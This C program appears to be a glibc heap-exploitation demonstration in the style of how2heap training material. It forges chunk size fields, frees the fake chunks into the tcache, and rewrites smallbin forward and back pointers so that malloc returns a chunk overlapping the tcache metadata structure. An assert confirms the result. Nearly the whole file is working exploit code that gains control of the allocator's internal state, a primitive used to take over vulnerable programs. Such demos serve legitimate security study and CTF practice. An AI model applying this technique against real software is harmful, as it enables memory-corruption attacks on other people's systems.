#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

void dump_memory(void *addr, unsigned long count) {
	for (unsigned int i = 0; i < count*16; i += 16) {
		printf("0x%016lx\t\t0x%016lx  0x%016lx\n", (unsigned long)(addr+i), *(long *)(addr+i), *(long *)(addr+i+0x8));
	}	
}

int main(void) {
	void *_ = NULL;

	setbuf(stdin, NULL);
	setbuf(stdout, NULL);
	setbuf(stderr, NULL);


	puts("\t- chunks:");

	void *relative_chunk = malloc(0x88);
	printf("\t\t* relative_chunk\t@ %p\n", relative_chunk);
	_ = malloc(0x18);
	
	puts("\t\t* /guard/");

	void *small_start = malloc(0x88);
	printf("\t\t* small_start\t@ %p\n", small_start);
	_ = malloc(0x18);
	
	puts("\t\t* /guard/");

	void *small_end = malloc(0x88);
	printf("\t\t* small_end\t@ %p\n", small_end);
	_ = malloc(0x18);
	
	puts("\t\t* /guard/");
	
	puts("");

	void *metadata = (void *)((long)(relative_chunk) & ~(0xfff));

	void *x[7];
	for (int i = 0; i < 7; i++) {
		x[i] = malloc(0x88);
	}

	puts("");

	for (int i = 0; i < 7; i++) {
		free(x[i]);
	}
	
	puts("small_start:");
	printf("0x%016lx\t\t0x%016lx  0x%016lx  <-- tcachebins[0x330][0/1], unsortedbin[all][0]\n", (unsigned long)(small_start-0x10), *(long *)(small_start-0x10), *(long *)(small_start-0x8));
	dump_memory(small_start, 2);
	puts("");

	puts("small_end:");
	printf("0x%016lx\t\t0x%016lx  0x%016lx  <-- tcachebins[0x320][0/1], unsortedbin[all][2]\n", (unsigned long)(small_end-0x10), *(long *)(small_end-0x10), *(long *)(small_end-0x8));
	dump_memory(small_end, 2);


	printf("\t*%p-0x18 = 0x331\n", small_start);
	*(long*)(small_start-0x18) = 0x331;
	puts("");

	dump_memory(small_start-0x20, 3);
	puts("");

	printf("Free the faked 0x331 chunk @ %p\n", small_start-0x10);
	free(small_start-0x10); // Create a fake FWD
	puts("");
	
	printf("\t*%p-0x8 = 0x91\n", small_start);
	*(long*)(small_start-0x8) = 0x91;
	puts("");


	printf("\t*%p-0x18 = 0x321\n", small_end);
	*(long*)(small_end-0x18) = 0x321;
	puts("");
	
	dump_memory(small_end-0x20, 3);
	puts("");
	
	printf("Free the faked 0x321 chunk @ %p\n", small_end-0x10);
	free(small_end-0x10); // Create a fake BCK
	puts("");
	
	printf("\t*%p-0x8 = 0x91\n", small_end);
	*(long*)(small_end-0x8) = 0x91;
	puts("");

	puts("\t> free(small_end);");
	free(small_end);
	
	puts("\t> free(relative_chunk);");
	free(relative_chunk);
	
	puts("\t> free(small_start);");
	free(small_start);
	
	puts("\n");

	_ = malloc(0x700);

	puts("");

		
	printf("\t- Small bin:\n");
	puts("\t\tsmall_start <--> relative_chunk <--> small_end");
	printf("\t\t%p <--> %p <--> %p\n", small_start-0x10, relative_chunk-0x10, small_end-0x10);
	
	printf("\t- 0x320 t-cache:\n");
	printf("\t\t* 0x%lx\n", *(long*)(metadata+0x390));
	printf("\t- 0x330 t-cache\n");
	printf("\t\t* 0x%lx\n", *(long*)(metadata+0x398));
	puts("");

	dump_memory(metadata+0x370, 4);
	puts("");


	printf("\t- small_start:\n");
	printf("\t\t*%p = %p\n", small_start, metadata+0x200);
	*(unsigned long *)small_start = (unsigned long)(metadata+0x200);
	puts("");

	printf("\t- small_end:\n");
	printf("\t\t*%p = %p\n", small_end, metadata+0x200);
	*(unsigned long *)(small_end+0x8) = (unsigned long)(metadata+0x200);
	puts("");

	puts("\t- small bin:");
	printf("\t\t small_start <--> metadata chunk <--> small_end\n");
	printf("\t\t %p\t     %p      %p\n", small_start, metadata+0x200, small_end);

	for(int i = 7; i > 0; i--)
		_ = malloc(0x88);

	_ = malloc(0x88);
	_ = malloc(0x88);

	void *meta_chunk = malloc(0x88);

	printf("\t\tNew chunk\t @ %p\n", meta_chunk);
	printf("\t\tt-cache metadata @ %p\n", metadata);
	assert(meta_chunk == (metadata+0x210));
}
